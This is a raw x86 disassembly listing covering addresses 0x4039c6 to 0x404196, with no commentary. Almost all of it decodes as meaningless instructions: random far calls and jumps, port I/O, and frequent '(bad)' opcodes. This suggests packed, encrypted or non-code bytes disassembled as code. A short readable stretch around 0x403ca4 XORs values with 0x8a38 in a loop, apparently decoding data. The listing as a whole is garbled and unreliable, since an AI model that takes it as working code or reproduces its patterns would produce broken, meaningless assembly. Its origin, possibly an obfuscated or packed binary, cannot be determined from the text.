  4039c6:	test   eax,0xcab71c8d
  4039cb:	fs xchg ebp,eax
  4039cd:	xchg   esi,eax
  4039ce:	in     eax,0x6f
  4039d0:	ror    BYTE PTR [ebx],1
  4039d2:	adc    esi,DWORD PTR [edi-0x79]
  4039d5:	nop
  4039d6:	frstor [esi]
  4039d8:	sbb    ecx,edi
  4039da:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4039db:	xchg   ah,dl
  4039dd:	leave  
  4039de:	call   0x6f54:0x44137993
  4039e5:	mov    dl,0x70
  4039e7:	in     eax,dx
  4039e8:	lea    ebx,[esp+ebx*2]
  4039eb:	shr    DWORD PTR [esi-0x6b87a44b],0xbb
  4039f2:	popf   
  4039f3:	cmp    eax,0x84f8cdb3
  4039f8:	mov    al,0x25
  4039fa:	shl    DWORD PTR [edi],cl
  4039fc:	ret    0x46e6
  4039ff:	loope  0x4039e1
  403a01:	push   ebp
  403a02:	call   0xfe0b34e7
  403a07:	push   esi
  403a08:	inc    edx
  403a09:	push   0x91655af9
  403a0e:	loop   0x403a0b
  403a10:	retf   0x6671
  403a13:	lods   eax,DWORD PTR ds:[esi]
  403a14:	mov    ch,0x79
  403a16:	inc    esp
  403a17:	retf   
  403a18:	outs   dx,BYTE PTR ds:[esi]
  403a19:	aaa    
  403a1a:	sar    DWORD PTR [eax+0x63],1
  403a1d:	dec    ebp
  403a1e:	mov    dh,0xf
  403a20:	lods   al,BYTE PTR ds:[esi]
  403a21:	lods   eax,DWORD PTR ds:[esi]
  403a22:	jmp    0xafdb3fe2
  403a27:	xor    DWORD PTR [esi],ebx
  403a29:	addr16 push ecx
  403a2b:	jmpw   0x805
  403a2f:	push   ecx
  403a30:	pop    ecx
  403a31:	sub    al,0xea
  403a33:	xor    al,0x49
  403a35:	das    
  403a36:	and    DWORD PTR [esi+0x7dc6d896],edi
  403a3c:	push   eax
  403a3d:	repz jmp 0x5cb2:0xfa890a41
  403a45:	(bad)  
  403a46:	push   eax
  403a47:	mov    eax,0x1d9b1b49
  403a4c:	ficom  DWORD PTR [ecx+0x27]
  403a4f:	outs   dx,BYTE PTR ds:[esi]
  403a50:	stos   DWORD PTR es:[edi],eax
  403a51:	sbb    BYTE PTR [esi+0x35596df4],ah
  403a57:	fiadd  DWORD PTR gs:[edi+0xb0c4d91]
  403a5e:	sbb    dl,cl
  403a60:	and    eax,0xe374269d
  403a65:	inc    ecx
  403a66:	popa   
  403a67:	(bad)  
  403a68:	adc    al,0x8c
  403a6a:	xchg   ebp,ebx
  403a6c:	or     ch,BYTE PTR [edi]
  403a6e:	lock adc ebx,DWORD PTR [edi-0x26e3d167]
  403a75:	test   al,0x6a
  403a77:	nop
  403a78:	xlat   BYTE PTR ds:[ebx]
  403a79:	push   ecx
  403a7a:	lahf   
  403a7b:	jno    0x403a7d
  403a7d:	out    0xcd,al
  403a7f:	inc    edi
  403a80:	imul   esi,DWORD PTR [ecx],0xabfc5e5d
  403a86:	lea    ebx,[eax]
  403a88:	push   es
  403a89:	ins    DWORD PTR es:[edi],dx
  403a8a:	inc    esi
  403a8b:	adc    al,0xcb
  403a8d:	in     eax,dx
  403a8e:	lea    edx,[edi-0x58]
  403a91:	mov    ds:0x4806b411,al
  403a96:	retf   0x7bc
  403a99:	inc    edi
  403a9a:	add    eax,0x109ec2aa
  403a9f:	call   0xcb0b:0xe788d38a
  403aa6:	inc    ebp
  403aa7:	test   DWORD PTR [ebp-0x186a8267],0x5fe970e1
  403ab1:	xchg   ebx,eax
  403ab2:	mov    al,ds:0x22425a4d
  403ab7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403ab8:	pop    ebx
  403ab9:	add    bl,ah
  403abb:	jecxz  0x403b15
  403abd:	iret   
  403abe:	mov    bh,0xaa
  403ac0:	pusha  
  403ac1:	cs inc ebx
  403ac3:	loopne 0x403b03
  403ac5:	push   0xf60c67f3
  403aca:	ret    0xdce5
  403acd:	ins    BYTE PTR es:[edi],dx
  403ace:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403acf:	fadd   QWORD PTR [ebx]
  403ad1:	xchg   eax,eax
  403ad3:	pop    es
  403ad4:	push   ebx
  403ad5:	mov    esi,0xe6166b3
  403ada:	aam    0xda
  403adc:	lods   al,BYTE PTR ds:[esi]
  403add:	cmp    dh,BYTE PTR [esi]
  403adf:	ret    
  403ae0:	push   eax
  403ae1:	int    0xba
  403ae3:	aam    0x7a
  403ae5:	mov    bh,0x26
  403ae7:	mov    ebp,0x482a9d25
  403aec:	jg     0x403b3e
  403aee:	adc    ah,BYTE PTR [ecx+0x3b758730]
  403af4:	mov    eax,ds:0xab6f002b
  403af9:	addr16 push edx
  403afb:	pop    edi
  403afc:	mov    eax,0xaf6b6807
  403b01:	push   es
  403b02:	mov    esp,0x3d8e2b2c
  403b07:	jmp    0x46ad:0x76937025
  403b0e:	sbb    DWORD PTR [ebp+0x5a8d8e76],ecx
  403b14:	fild   QWORD PTR [edx+0x30ceceaa]
  403b1a:	jmp    0x41415927
  403b1f:	lock inc ebp
  403b21:	jle    0x403b82
  403b23:	or     ah,BYTE PTR [ebx+ebx*8+0x4b8a27c5]
  403b2a:	adc    ah,0x96
  403b2d:	daa    
  403b2e:	cld    
  403b2f:	or     eax,0x3449e8f3
  403b34:	cmp    al,0x81
  403b36:	cs mov ah,0x63
  403b39:	std    
  403b3a:	aad    0xcc
  403b3c:	pusha  
  403b3d:	das    
  403b3e:	lods   al,BYTE PTR ds:[esi]
  403b3f:	sbb    ecx,DWORD PTR [edx+edi*1]
  403b42:	dec    eax
  403b43:	loopne 0x403af4
  403b45:	test   BYTE PTR [ebx+0x4f77940c],bl
  403b4b:	fldcw  WORD PTR [esi-0x41]
  403b4e:	popa   
  403b4f:	push   eax
  403b50:	or     eax,0x4457972f
  403b55:	xchg   esi,eax
  403b56:	sbb    eax,0x8a609502
  403b5b:	xor    ch,BYTE PTR [ecx-0x14]
  403b5e:	mov    eax,0xf3a57ddb
  403b63:	push   eax
  403b64:	mov    eax,0xfd5dce44
  403b69:	inc    esp
  403b6a:	ret    
  403b6b:	adc    DWORD PTR [ecx+0x3268ca0e],0xdcebc178
  403b75:	rcl    DWORD PTR [edx],0xaa
  403b78:	push   edi
  403b79:	xchg   edx,eax
  403b7a:	cmp    BYTE PTR [ebx],al
  403b7c:	pop    ecx
  403b7d:	and    bl,BYTE PTR [ebp-0x2]
  403b80:	add    eax,0x3f90afc2
  403b85:	adc    bh,BYTE PTR [eax-0x6b5c5a50]
  403b8b:	hlt    
  403b8c:	in     al,dx
  403b8d:	cld    
  403b8e:	sbb    dl,dl
  403b90:	repz dec esi
  403b92:	aad    0xe5
  403b94:	test   BYTE PTR [ecx+0x25677f20],dl
  403b9a:	sbb    ecx,DWORD PTR [ebx-0x3f64149a]
  403ba0:	xor    DWORD PTR [ebx+0x1b],eax
  403ba3:	fdiv   QWORD PTR [eax+0x2b]
  403ba6:	lahf   
  403ba7:	adc    al,0xca
  403ba9:	pop    ebx
  403baa:	in     eax,dx
  403bab:	dec    esp
  403bac:	or     edi,esp
  403bae:	xor    DWORD PTR [ecx+ebx*4],0x73
  403bb2:	call   0xa2b71696
  403bb7:	xchg   ebp,eax
  403bb8:	mov    esp,0x7a4c7017
  403bbd:	test   BYTE PTR [edx+edi*1-0x40],al
  403bc1:	sbb    DWORD PTR [edx-0x409eec26],esp
  403bc7:	inc    esi
  403bc8:	jns    0x403b4c
  403bca:	sbb    eax,DWORD PTR [edi-0x6e83fbad]
  403bd0:	call   0xe853:0x81962f3f
  403bd7:	imul   esp,DWORD PTR [ecx+0x4b1b1091],0x49
  403bde:	popa   
  403bdf:	stos   DWORD PTR es:[edi],eax
  403be0:	(bad)  
  403be2:	fisub  WORD PTR [ebx]
  403be4:	cmp    eax,0xea28e223
  403be9:	sbb    al,0x4e
  403beb:	pop    es
  403bec:	aad    0xce
  403bee:	stos   DWORD PTR es:[edi],eax
  403bef:	outs   dx,DWORD PTR ds:[esi]
  403bf0:	mov    cl,0x59
  403bf2:	inc    eax
  403bf3:	call   0xd5b:0x2a7bc9ab
  403bfa:	mov    esp,0x12151ff4
  403bff:	xor    ecx,DWORD PTR [eax]
  403c01:	push   esi
  403c02:	leave  
  403c03:	or     DWORD PTR [edx-0x7352f1ec],0x37
  403c0a:	(bad)  [esi-0x4f]
  403c0d:	xor    eax,0xf48f0d60
  403c12:	ret    0x9013
  403c15:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403c16:	(bad)  
  403c17:	mov    bl,0x22
  403c19:	or     BYTE PTR [edx],dh
  403c1b:	lock or bl,ah
  403c1e:	ds sar ecx,cl
  403c21:	pop    edi
  403c22:	sahf   
  403c23:	push   es
  403c24:	scas   al,BYTE PTR es:[edi]
  403c25:	popa   
  403c26:	or     BYTE PTR [ecx],ah
  403c28:	aas    
  403c29:	mov    es,edi
  403c2b:	jecxz  0x403bca
  403c2d:	xchg   BYTE PTR [edx+edi*8],ah
  403c30:	and    al,0x12
  403c32:	mov    al,0xeb
  403c34:	adc    esi,eax
  403c36:	popf   
  403c37:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403c38:	sub    eax,0x72bb2401
  403c3d:	sub    BYTE PTR [ebx-0x15],dl
  403c40:	fwait
  403c41:	add    esi,DWORD PTR [ebx-0x589f8e08]
  403c47:	xlat   BYTE PTR ds:[ebx]
  403c48:	mov    ch,BYTE PTR [ecx+0x395239a5]
  403c4e:	sbb    al,0x65
  403c50:	mov    es,WORD PTR ds:0x35a5d9fd
  403c56:	int3   
  403c57:	ins    BYTE PTR es:[edi],dx
  403c58:	mov    bh,dl
  403c5a:	mov    ebx,0xb60c26d5
  403c5f:	popa   
  403c60:	adc    eax,0x45fd4048
  403c65:	dec    DWORD PTR [esi+0x62]
  403c68:	test   BYTE PTR [edx+0xb4284ad],0x35
  403c6f:	enter  0x9209,0x31
  403c73:	cli    
  403c74:	pop    es
  403c75:	loopne 0x403c78
  403c77:	xchg   edx,eax
  403c78:	aas    
  403c79:	sldt   WORD PTR [eax]
  403c7c:	xor    al,0xd8
  403c7e:	mov    bh,0x87
  403c80:	inc    edi
  403c81:	scas   eax,DWORD PTR es:[edi]
  403c82:	dec    esi
  403c83:	clc    
  403c84:	inc    ebx
  403c85:	enter  0xb82e,0x25
  403c89:	loope  0x403c3f
  403c8b:	add    BYTE PTR [ecx],dl
  403c8d:	jecxz  0x403d0a
  403c8f:	jo     0x403ce1
  403c91:	pop    edi
  403c92:	sub    eax,0xed5c3070
  403c97:	mov    ebp,0x24514cec
  403c9c:	jno    0x403caa
  403c9e:	(bad)  
  403c9f:	arpl   WORD PTR [ebp+0x66],sp
  403ca2:	add    eax,edi
  403ca4:	movzx  eax,ax
  403ca7:	mov    DWORD PTR [ebp-0x14],eax
  403caa:	mov    eax,DWORD PTR [ebp+0x8]
  403cad:	movzx  eax,WORD PTR [eax+edx*4]
  403cb1:	xor    eax,0x8a38
  403cb6:	add    eax,edi
  403cb8:	mov    edi,DWORD PTR [ebp-0x14]
  403cbb:	mov    BYTE PTR [ebp+edi*1-0x58],al
  403cbf:	mov    eax,DWORD PTR [ebp-0xc]
  403cc2:	inc    edx
  403cc3:	cmp    edx,eax
  403cc5:	jne    0x40389a
  403ccb:	pop    edi
  403ccc:	pop    ebx
  403ccd:	mov    eax,DWORD PTR [ebp-0x8]
  403cd0:	mov    edx,DWORD PTR [ebp+0x10]
  403cd3:	xor    eax,ecx
  403cd5:	add    eax,esi
  403cd7:	mov    DWORD PTR [edx],eax
  403cd9:	jmp    0x4040ce
  403cde:	mov    ch,0xd5
  403ce0:	or     dh,al
  403ce2:	push   0xfffffff1
  403ce4:	jge    0x403d43
  403ce6:	inc    eax
  403ce7:	xchg   ecx,eax
  403ce8:	add    esp,0x872e4f50
  403cee:	mov    ebx,0x567e7e1f
  403cf3:	jns    0x403d73
  403cf5:	jle    0x403d55
  403cf7:	std    
  403cf8:	sub    BYTE PTR [bx],ah
  403cfb:	test   al,0xe4
  403cfd:	mov    ch,0x64
  403cff:	lahf   
  403d00:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403d01:	rcr    DWORD PTR [ebp-0x2b],cl
  403d04:	(bad)  
  403d05:	out    dx,al
  403d06:	xchg   edi,eax
  403d07:	ins    BYTE PTR es:[edi],dx
  403d08:	push   esi
  403d09:	test   BYTE PTR [eax],0xf3
  403d0c:	jnp    0x403ce6
  403d0e:	push   edx
  403d0f:	(bad)
  403d12:	(bad)  
  403d13:	or     eax,edx
  403d15:	(bad)  [edx-0x59]
  403d18:	dec    ebp
  403d19:	call   0x54a9:0x85c3e481
  403d20:	cmp    BYTE PTR [esi+0x56],ch
  403d23:	rcr    BYTE PTR es:0x733757b6,1
  403d2a:	adc    edx,DWORD PTR [ebp-0x55]
  403d2d:	add    BYTE PTR ds:0x53f24c3b,0xcc
  403d34:	add    ebp,DWORD PTR cs:[edi]
  403d37:	push   ebp
  403d38:	mov    gs,WORD PTR [edi]
  403d3a:	stc    
  403d3b:	pop    esp
  403d3c:	and    DWORD PTR [edx+0x6e],0xecf098c9
  403d43:	inc    esi
  403d44:	sub    BYTE PTR [ebx],dl
  403d46:	mov    WORD PTR [eax],gs
  403d48:	(bad)  
  403d49:	fsub   st,st(3)
  403d4b:	xor    eax,0x2a6a60ad
  403d50:	push   ss
  403d51:	cmp    BYTE PTR [esi],cl
  403d53:	cld    
  403d54:	jno    0x403d1f
  403d56:	repz aam 0xcb
  403d59:	clc    
  403d5a:	rcl    esp,0xf2
  403d5d:	push   0xa2cd0c9c
  403d62:	sbb    eax,0xf8ad438
  403d67:	fisttp DWORD PTR [ecx]
  403d69:	inc    esp
  403d6a:	sub    BYTE PTR ds:0x96f55f8a,dl
  403d70:	ja     0x403d15
  403d72:	lock sar DWORD PTR [ecx+0x63],1
  403d76:	jmp    0x960a:0xe7bfc72a
  403d7d:	cld    
  403d7e:	pop    ebx
  403d7f:	jp     0x403dff
  403d81:	retf   
  403d82:	or     ch,al
  403d84:	jb     0x403dc1
  403d86:	add    eax,0xb5c0492c
  403d8b:	cmp    BYTE PTR [ebx],0xa8
  403d8e:	cmc    
  403d8f:	out    0x2,al
  403d91:	retf   0xc562
  403d94:	lods   al,BYTE PTR ds:[esi]
  403d95:	mov    DWORD PTR [ecx+ebp*1],ebp
  403d98:	in     eax,dx
  403d99:	fs or  al,0xe
  403d9c:	mov    ch,BYTE PTR [ebx-0x6892c22f]
  403da2:	retf   
  403da3:	lea    ebx,[ebx]
  403da5:	adc    BYTE PTR [edx+0x30],0x12
  403da9:	xchg   BYTE PTR [eax-0x4f57fa85],al
  403daf:	xor    ebp,ebx
  403db1:	into   
  403db2:	in     al,dx
  403db3:	jecxz  0x403e2c
  403db5:	mov    dl,0xae
  403db7:	xor    al,0xf1
  403db9:	inc    esi
  403dba:	and    ebp,DWORD PTR [esp+ecx*4-0x6b]
  403dbe:	xchg   esi,eax
  403dbf:	(bad)  
  403dc1:	imul   eax,DWORD PTR [eax],0xffffffa5
  403dc4:	cs aam 0xeb
  403dc7:	and    DWORD PTR [edx+ebx*8],edi
  403dca:	jnp    0x403d6a
  403dcc:	pop    edx
  403dcd:	dec    esi
  403dce:	push   0x6b
  403dd0:	push   cs
  403dd1:	xchg   ebp,eax
  403dd2:	ins    BYTE PTR es:[edi],dx
  403dd3:	mov    edx,DWORD PTR [edx]
  403dd5:	lods   eax,DWORD PTR ds:[esi]
  403dd6:	and    al,BYTE PTR [esi-0x4ba4b704]
  403ddc:	aaa    
  403ddd:	dec    ebx
  403dde:	pop    ebp
  403ddf:	test   ebp,esp
  403de1:	mov    ch,0x35
  403de3:	fidiv  WORD PTR [esi+0x57]
  403de6:	lea    eax,[esi-0x29a6091a]
  403dec:	rol    DWORD PTR [eax+eax*8],1
  403def:	xor    BYTE PTR [ecx+0x4411a2c3],ch
  403df5:	mov    BYTE PTR [ecx+0x6],dh
  403df8:	add    ebp,0xffffff96
  403dfb:	mov    ds:0x28810fef,al
  403e00:	fucomp st(0)
  403e02:	and    ah,BYTE PTR [esi-0x73c9db8b]
  403e08:	sahf   
  403e09:	mov    esp,DWORD PTR [ebp-0x6f99181f]
  403e0f:	jg     0x403df1
  403e11:	int3   
  403e12:	sti    
  403e13:	and    BYTE PTR [ebx+ebx*8-0x273daf9c],0x1e
  403e1b:	outs   dx,DWORD PTR ds:[esi]
  403e1c:	fwait
  403e1d:	in     eax,dx
  403e1e:	into   
  403e1f:	jp     0x403e9e
  403e21:	inc    esi
  403e22:	push   eax
  403e23:	fldcw  WORD PTR [esi]
  403e25:	inc    edi
  403e26:	neg    BYTE PTR [eax]
  403e28:	repnz pop eax
  403e2a:	lahf   
  403e2b:	repnz test al,0xa2
  403e2e:	cwde   
  403e2f:	push   edx
  403e30:	pop    esi
  403e31:	mov    ds:0xad38391e,al
  403e36:	mul    BYTE PTR [ebx-0x2309d56d]
  403e3c:	cmp    ah,BYTE PTR [ebx-0x52]
  403e3f:	pop    ds
  403e40:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403e41:	hlt    
  403e42:	mov    dl,0x4c
  403e44:	ret    0x7c4a
  403e47:	sub    DWORD PTR [esi-0x6c],esi
  403e4a:	imul   edi,DWORD PTR [edx+edx*4-0x7f],0x1
  403e4f:	mov    ds:0xbc0558f5,eax
  403e54:	(bad)  
  403e55:	stc    
  403e56:	sar    BYTE PTR [ebx+edx*4+0x5e],0xf
  403e5b:	xchg   ebx,eax
  403e5c:	lahf   
  403e5d:	pop    edi
  403e5e:	cli    
  403e5f:	xchg   ecx,eax
  403e60:	lahf   
  403e61:	outs   dx,BYTE PTR ds:[esi]
  403e62:	jnp    0x403df4
  403e64:	mov    ebx,0xe21ed89f
  403e69:	cmc    
  403e6a:	mov    esp,0xe8de3e54
  403e6f:	ret    0x3e28
  403e72:	frstor [ebx-0x30cad2a8]
  403e78:	in     al,dx
  403e79:	pushf  
  403e7a:	sbb    BYTE PTR [ecx],0x4a
  403e7d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403e7e:	jo     0x403e7c
  403e80:	call   FWORD PTR ds:0x86b74f7f
  403e86:	xor    BYTE PTR [eax],dl
  403e88:	add    ebx,DWORD PTR [edi]
  403e8a:	loop   0x403e18
  403e8c:	mov    BYTE PTR [ebp-0x5b3ea2d2],dl
  403e92:	sti    
  403e93:	lahf   
  403e94:	(bad)  
  403e95:	lods   al,BYTE PTR ds:[esi]
  403e96:	sbb    al,0x32
  403e98:	sbb    bl,ch
  403e9a:	jns    0x403ea4
  403e9c:	adc    ecx,ecx
  403e9e:	mov    ds:0x5ec34775,al
  403ea3:	xchg   edi,eax
  403ea4:	or     al,0xc1
  403ea6:	aaa    
  403ea7:	mov    dl,0xec
  403ea9:	rcr    BYTE PTR [ecx],0xc0
  403eac:	into   
  403ead:	ficom  WORD PTR [ecx-0x6d3c6b11]
  403eb3:	ins    BYTE PTR es:[edi],dx
  403eb4:	add    ebp,ebx
  403eb6:	ds pop edx
  403eb8:	lahf   
  403eb9:	xor    BYTE PTR [ecx],dl
  403ebb:	and    bh,BYTE PTR [ebx-0x55]
  403ebe:	aaa    
  403ebf:	test   BYTE PTR [eax+0x2a5747d4],0xc2
  403ec6:	rcl    dl,1
  403ec8:	stc    
  403ec9:	mov    DWORD PTR [edx+0x49e71eab],edi
  403ecf:	mov    edi,0x78098c7c
  403ed4:	cwde   
  403ed5:	adc    ebx,DWORD PTR [eax+ecx*8+0x7c2b184b]
  403edc:	sub    ch,bh
  403ede:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403edf:	sub    esi,edx
  403ee1:	hlt    
  403ee2:	cdq    
  403ee3:	add    eax,DWORD PTR [eax+eiz*4-0x20926ccd]
  403eea:	cwde   
  403eeb:	(bad)  
  403eec:	add    BYTE PTR [esp+ebx*8+0x721a6088],0x41
  403ef4:	push   cs
  403ef5:	loope  0x403ea7
  403ef7:	xchg   ebx,eax
  403ef8:	data16 xlat BYTE PTR ds:[ebx]
  403efa:	pop    ss
  403efb:	mov    al,0x8c
  403efd:	adc    bh,dh
  403eff:	fldenv [ebp+eax*1+0xe]
  403f03:	mov    BYTE PTR [edi-0x58],cl
  403f06:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403f07:	cmp    DWORD PTR [eax+0x4d],esp
  403f0a:	(bad)  
  403f0b:	fxch   st(7)
  403f0d:	aad    0xad
  403f0f:	call   0xc3ad:0x13143fd0
  403f16:	sub    ecx,DWORD PTR [esi+esi*2+0x1d40eb1e]
  403f1d:	inc    ebp
  403f1e:	push   ecx
  403f1f:	xchg   edi,eax
  403f20:	pop    edi
  403f21:	(bad)  
  403f22:	clc    
  403f23:	cmp    BYTE PTR [esi+0x37dd1bf7],ah
  403f29:	push   ss
  403f2a:	icebp  
  403f2b:	das    
  403f2c:	cli    
  403f2d:	cmp    bh,0x58
  403f30:	cmp    bh,BYTE PTR [edx+0x75]
  403f33:	cld    
  403f34:	les    ebp,FWORD PTR [esp+eax*2]
  403f37:	jbe    0x403f9b
  403f39:	ror    DWORD PTR [ebx-0x7a],cl
  403f3c:	stos   DWORD PTR es:[edi],eax
  403f3d:	addr16 dec ebp
  403f3f:	sbb    edx,DWORD PTR [edx+ecx*1+0x31]
  403f43:	imul   ecx,DWORD PTR [ebp-0x4c],0xffffffea
  403f47:	in     eax,dx
  403f48:	and    al,0x2f
  403f4a:	mov    ds:0x4b9772dc,al
  403f4f:	xchg   esi,eax
  403f50:	repz ficom WORD PTR [eax-0x584e7fc6]
  403f57:	pop    ss
  403f58:	lock xor eax,0xd197f2be
  403f5e:	jns    0x403ee6
  403f60:	test   al,0xe1
  403f62:	add    eax,0x40281e00
  403f67:	in     al,0x2b
  403f69:	loop   0x403f4b
  403f6b:	pop    ebp
  403f6c:	mov    ah,0x23
  403f6e:	dec    eax
  403f6f:	xchg   esp,eax
  403f70:	mov    dl,0x45
  403f72:	pop    ecx
  403f73:	in     al,dx
  403f74:	fisttp WORD PTR [ebx]
  403f76:	stos   BYTE PTR es:[edi],al
  403f77:	mov    ah,0xad
  403f79:	mov    ds:0xd9bb1268,al
  403f7e:	dec    ebx
  403f7f:	bound  edi,QWORD PTR [edx+edx*8-0x598fe2cb]
  403f86:	leave  
  403f87:	cmp    DWORD PTR [eax-0x44],eax
  403f8a:	jmp    0x52bb:0xf4631b25
  403f91:	or     BYTE PTR [eax],0xb5
  403f94:	stc    
  403f95:	add    al,al
  403f97:	fwait
  403f98:	xchg   bl,bh
  403f9a:	aaa    
  403f9b:	jae    0x403fd4
  403f9d:	xchg   ebp,eax
  403f9e:	adc    al,0xa9
  403fa0:	jecxz  0x403fd3
  403fa2:	hlt    
  403fa3:	cs pop ebp
  403fa5:	out    0xa,eax
  403fa7:	cmp    eax,0xc9d3a7a3
  403fac:	dec    eax
  403fad:	mov    DWORD PTR [ecx-0xa],esp
  403fb0:	push   0x901ad468
  403fb5:	adc    eax,esi
  403fb7:	push   es
  403fb8:	shl    BYTE PTR [edi+esi*1+0x2],cl
  403fbc:	inc    ebx
  403fbd:	push   esi
  403fbe:	xor    al,0x8a
  403fc0:	out    dx,al
  403fc1:	enter  0x3cb4,0x4e
  403fc5:	jmp    0x2ca40c62
  403fca:	push   edx
  403fcb:	cmp    eax,DWORD PTR [ebx+0x76892251]
  403fd1:	mov    dh,0x16
  403fd3:	push   ebx
  403fd4:	out    0x3c,eax
  403fd6:	and    eax,0xf8884dc2
  403fdb:	xor    eax,0xd3515509
  403fe0:	xchg   edx,eax
  403fe1:	mov    ah,0xe9
  403fe3:	int3   
  403fe4:	mov    WORD PTR [ebp-0x57e9f91b],es
  403fea:	xor    eax,0x6eae567e
  403fef:	jmp    0x665:0x4b325f1c
  403ff6:	lds    esi,FWORD PTR [edx]
  403ff8:	mov    dh,0x5e
  403ffa:	mov    ecx,0x3ce9e807
  403fff:	out    dx,al
  404000:	add    eax,0x9e6fe506
  404005:	jae    0x404013
  404007:	xor    eax,0xe2845927
  40400c:	leave  
  40400d:	rol    BYTE PTR [edi],cl
  40400f:	(bad)  
  404010:	pop    ebp
  404011:	mov    ds:0x7d936cdb,eax
  404016:	cld    
  404017:	jl     0x403fbc
  404019:	sub    eax,0xa0d5860d
  40401e:	mov    dh,0xa6
  404020:	sbb    ebp,DWORD PTR [edi-0x32]
  404023:	not    DWORD PTR [edi+0xff79673]
  404029:	or     bh,BYTE PTR [esi-0x7b2b44ec]
  40402f:	add    ah,ah
  404031:	cmp    DWORD PTR [ecx+ebx*4-0x34c2c1b5],ebp
  404038:	add    ah,0x8a
  40403b:	mov    fs,ebx
  40403d:	push   ds
  40403e:	sub    DWORD PTR [esi+0x7a],ebx
  404041:	iret   
  404042:	xchg   DWORD PTR [esi-0x39],edx
  404045:	and    al,0xeb
  404047:	inc    ecx
  404048:	sti    
  404049:	dec    ecx
  40404a:	dec    esi
  40404b:	inc    ebx
  40404c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40404d:	and    BYTE PTR ss:[edi-0x13],dh
  404051:	lock das 
  404053:	(bad)  
  404054:	xor    BYTE PTR [edx+0x2ee2ca03],dl
  40405a:	hlt    
  40405b:	lock fcmovnu st,st(5)
  40405e:	loop   0x4040c0
  404060:	fnstcw WORD PTR [edx+eax*4+0x6d0d338b]
  404067:	inc    DWORD PTR [ecx-0x47]
  40406a:	push   ss
  40406b:	pop    edi
  40406c:	arpl   WORD PTR [edx+0x34],di
  40406f:	enter  0x65d8,0xd6
  404073:	stos   DWORD PTR es:[edi],eax
  404074:	clc    
  404075:	fimul  WORD PTR [edi]
  404077:	cmp    al,0x8
  404079:	jne    0x4040c8
  40407b:	loope  0x4040e9
  40407d:	in     al,0x32
  40407f:	in     eax,0x99
  404081:	push   ss
  404082:	jmp    0xaed69b2f
  404087:	add    eax,0xc96d1a05
  40408c:	jecxz  0x404043
  40408e:	popa   
  40408f:	fs inc edx
  404091:	mov    ebp,0xf9dc9741
  404096:	xchg   esp,eax
  404097:	pop    ss
  404098:	(bad)  
  404099:	xor    DWORD PTR ds:0x7c4394a4,edi
  40409f:	jmp    0xd4074f30
  4040a4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4040a5:	push   edx
  4040a6:	mov    ecx,0x290bd0df
  4040ab:	add    al,0x97
  4040ad:	pop    eax
  4040ae:	neg    bh
  4040b0:	sub    eax,DWORD PTR [edi+0x38]
  4040b3:	xchg   BYTE PTR [edi+0x796ad606],bh
  4040b9:	mov    cl,0xe5
  4040bb:	sti    
  4040bc:	mov    dl,0xb8
  4040be:	mov    cl,0x5b
  4040c0:	sub    DWORD PTR [ecx+eax*4+0x5],0xffffffa1
  4040c5:	mov    edi,0xe41f5137
  4040ca:	mov    dl,0xc6
  4040cc:	addr16 mov eax,0x33f8458b
  4040d2:	rol    DWORD PTR [ebx],0xc6
  4040d5:	mov    DWORD PTR [ebp+0x8],eax
  4040d8:	mov    eax,DWORD PTR [ebp+0x8]
  4040db:	jmp    0x4044d0
  4040e0:	pop    edx
  4040e1:	ret    0x1375
  4040e4:	jge    0x4040a3
  4040e6:	ins    BYTE PTR es:[edi],dx
  4040e7:	jae    0x404096
  4040e9:	test   BYTE PTR [eax-0x4187d833],ah
  4040ef:	add    dl,BYTE PTR [ebx+0x567e7e1b]
  4040f5:	jns    0x404175
  4040f7:	jle    0x4040b3
  4040f9:	xchg   edx,eax
  4040fa:	arpl   WORD PTR [ebx],ax
  4040fc:	push   edx
  4040fd:	sub    BYTE PTR [esp+ecx*4-0x2f0ce056],al
  404104:	mov    eax,0xcd431aa4
  404109:	(bad)  
  40410a:	out    dx,eax
  40410b:	inc    ecx
  40410c:	les    ecx,FWORD PTR [edx+0x5395060e]
  404112:	dec    edx
  404113:	or     eax,ebx
  404115:	and    BYTE PTR [esi+0x617ef601],al
  40411b:	(bad)  
  40411c:	mov    edi,0x515eef2e
  404121:	out    dx,eax
  404122:	fsubr  QWORD PTR [eax]
  404124:	clc    
  404125:	dec    eax
  404126:	test   cl,0xcc
  404129:	sbb    al,0xc0
  40412b:	cs jg  0x4040b8
  40412e:	mov    ds:0xb066a4bd,al
  404133:	rol    BYTE PTR [esi+edi*2-0x523310b3],1
  40413a:	fcmovu st,st(0)
  40413c:	sbb    DWORD PTR [edi+0x27],edi
  40413f:	shl    BYTE PTR [ecx-0x10caaf17],cl
  404145:	cmp    al,0x35
  404147:	pop    ss
  404148:	mov    esi,0x132fd130
  40414d:	mov    dh,0x12
  40414f:	shr    DWORD PTR [eax-0x4b1caa7e],0xc7
  404156:	push   ds
  404157:	xchg   esi,eax
  404158:	push   es
  404159:	xchg   esi,eax
  40415a:	jmp    0x687e430b
  40415f:	cmc    
  404160:	int    0xa9
  404162:	dec    edi
  404163:	push   0x62
  404165:	stc    
  404166:	dec    ebp
  404167:	lock pop es
  404169:	lea    ebp,[ebx]
  40416b:	popf   
  40416c:	inc    esi
  40416d:	dec    esp
  40416e:	ins    DWORD PTR es:[edi],dx
  40416f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404170:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404171:	mov    ecx,0xe9d90895
  404176:	scas   eax,DWORD PTR es:[edi]
  404177:	pop    esi
  404178:	shl    DWORD PTR [edi],cl
  40417a:	mov    ?,WORD PTR [ebx-0x38]
  40417d:	repz push 0x1b9c82c0
  404183:	cs push ebx
  404185:	add    BYTE PTR [ebx-0x3114328e],0x3f
  40418c:	xlat   BYTE PTR ds:[ebx]
  40418d:	addr16 xchg ebx,eax
  40418f:	mov    esp,0x703e485c
  404194:	hlt    
  404195:	popf   
  404196:	push   esp
